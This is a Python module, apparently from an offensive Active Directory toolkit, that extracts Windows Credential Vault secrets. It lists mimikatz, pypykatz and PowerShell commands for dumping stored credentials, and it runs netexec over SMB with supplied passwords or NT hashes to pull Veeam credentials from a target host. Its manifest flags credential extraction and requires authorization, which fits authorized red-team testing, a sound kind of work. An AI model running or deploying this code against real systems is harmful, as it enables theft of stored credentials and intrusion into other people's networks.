"""Windows Credential Vault extraction."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.credential.vault_extract.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1555.004"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)

    print("[*] Windows Credential Vault Extraction: {}".format(target or "local"))

    print("\n[*] Vault extraction methods:")
    print("  1. mimikatz: vault::cred /patch")
    print("  2. pypykatz: pypykatz lsa minidump <dump> --vaults")
    print("  3. PowerShell: [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials]::new().RetrieveAll()")

    import subprocess, shutil
    nxc = shutil.which("nxc") or shutil.which("netexec")
    if nxc and target:
        cmd = [nxc, "smb", target, "-u", cred.username or "",
               "-d", cred.domain]
        if cred.password:
            cmd += ["-p", cred.password]
        elif cred.nthash:
            cmd += ["-H", cred.nthash]
        cmd += ["-M", "veeam"]
        print("[*] Also checking Veeam credentials:")
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)

    return 0
